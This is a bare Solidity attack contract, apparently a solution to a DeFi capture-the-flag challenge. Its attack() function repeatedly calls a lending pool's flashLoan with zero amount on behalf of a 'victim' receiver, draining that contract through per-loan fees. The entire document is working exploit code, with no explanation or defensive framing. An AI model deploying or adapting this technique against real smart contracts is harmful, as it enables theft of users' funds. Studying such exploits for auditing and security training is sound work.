pragma solidity ^0.8.0;

contract NaiveAttack {
  address private _pool;
  address private _victim;
  constructor(address pool, address victim) public {
    _pool = pool;
    _victim = victim;
  }

  function attack() external {
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
    _pool.call(
      abi.encodeWithSignature("flashLoan(address,uint256)", _victim, 0)
    );
  }
}
